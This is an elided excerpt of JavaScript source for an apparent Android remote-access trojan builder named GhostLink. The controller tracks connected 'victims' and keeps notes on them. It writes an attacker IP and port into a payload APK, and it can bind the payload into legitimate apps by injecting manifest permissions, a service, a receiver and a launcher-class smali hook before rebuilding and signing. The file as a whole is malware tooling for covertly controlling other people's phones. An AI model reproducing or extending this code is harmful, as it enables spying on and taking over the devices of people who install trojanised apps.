...
app.controller("AppCtrl", ($scope) => {
    ...
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        try {
            ...
            console.error('Error handling new victim:', error);
        }
    });
    ...
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        ...
        // Reset selected victim if the disconnected one was selected
        if ($appCtrl.selectedVictimKey === index) {
            $appCtrl.selectedVictim = null;
            $appCtrl.selectedVictimKey = null;
        }
    ...
    // Functions for device notes
    $appCtrl.editNote = (key, victim, event) => {
        event.stopPropagation(); // Prevent row selection
        victim.isEditingNote = true;
        victim.tempNote = victim.note || '';
        $appCtrl.$apply();
    ...
    $appCtrl.saveNote = (key, victim) => {
        if (victim.isEditingNote) {
            const newNote = victim.tempNote || '';
            victim.note = newNote;
    ...
    // Handle note update response
    ipcRenderer.on('updateDeviceNoteResponse', (event, response) => {
        if (response.success) {
            $appCtrl.Log(`[✓] ${response.message}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $appCtrl.Log(`[x] ${response.message}`, CONSTANTS.logStatus.FAIL);
        }
    });
    ...
    // Edit note for selected device
    $appCtrl.editSelectedDeviceNote = () => {
        if ($appCtrl.selectedVictim && $appCtrl.selectedVictimKey) {
            const newNote = prompt('Enter note for this device:', $appCtrl.selectedVictim.note || '');
            if (newNote !== null) {
                $appCtrl.selectedVictim.note = newNote;
    ...
    $appCtrl.updateDeviceStats = () => {
        const onlineCount = Object.keys(viclist).length;
        const withNotesCount = Object.values(viclist).filter(victim => victim.note && victim.note.trim()).length;
    ...
    $appCtrl.openLab = (index) => {
        try {
            console.log('Opening lab for victim:', index);
            if (!index) {
                console.error('No victim index provided');
                return;
            }
            ipcRenderer.send('openLabWindow', 'lab.html', index);
        } catch (error) {
            console.error('Error opening lab:', error);
        }
    };

    $appCtrl.selectVictim = (key, victim) => {
        try {
    ...
    if (architecture === 'ia32') {
        delayedLog('[!] CẢNH BÁO: Phần mềm sẽ ngừng hỗ trợ cho tất cả các hệ thống 32 bit khi Apktool đạt đến v3.0.0', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to AIPT Software', CONSTANTS.logStatus.SUCCESS);
    ...
    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            ...
            try {
                ...
                const data = await fs.promises.readFile(dir.join(CONSTANTS.GhostLinkApkFolderPath, 'AndroidManifest.xml'), 'utf8');
                ...
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.GhostLinkApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );
        ...
        // Build the GhostLink Payload APK
            ...
            (error, stdout, stderr) => {
                ...
                exec(signApk, (error, stdout, stderr) => {
                    ...
                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        ...
                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.GhostLinkApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
    ...
    // function to create the smali payload directory for storing GhostLink payload directories and files when binding
    ...
    // function to copy GhostLink source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyGhostLinkFilesAndGenerateApk = (apkFolder) => {
        ...
        fs.readdir(apkFolder, {
            ...
            fs.mkdir(targetPayloadFolder, {
                ...
                fs.copy(dir.join(CONSTANTS.GhostLinkApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
    ...
    $appCtrl.modifyManifest = (data, callback) => {
        ...
        xml2js.parseString(data, {
            ...
            delayedLog('[★] Injecting GhostLink Payload Permissions...');
            ...
            delayedLog('[★] Injecting GhostLink Payload Service and Receiver...');
            ...
            const receiverTag = {
                $: {
                    ...
                    'android:name': CONSTANTS.GhostLinkReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
            ...
            const serviceTag = {
                $: {
                    ...
                    'android:name': CONSTANTS.GhostLinkService,
                },
            };
                        ...
                        xml2js.parseString(data, (err, result) => {
                            ...
                            const launcherPath = getLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                ...
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    ...
                                    delayedLog('[★] Injecting GhostLink Hook into the Main Class Smali File...');
    ...
    $appCtrl.Build = (ip, port) => {
        ...
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                ...
                $appCtrl.Log('[¡] GhostLink Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
                return;
                ...
                if (!$appCtrl.bindApk.enable) {
                    var ipPortFile = dir.join(CONSTANTS.GhostLinkApkFolderPath, CONSTANTS.IOSocketPath);
                    ...
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        ...
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            ...
                            $appCtrl.GenerateApk(CONSTANTS.GhostLinkApkFolderPath);
                        });
                    });
                } else {
                    ...
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        ...
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            ...
                            // generate a solid GhostLink apk
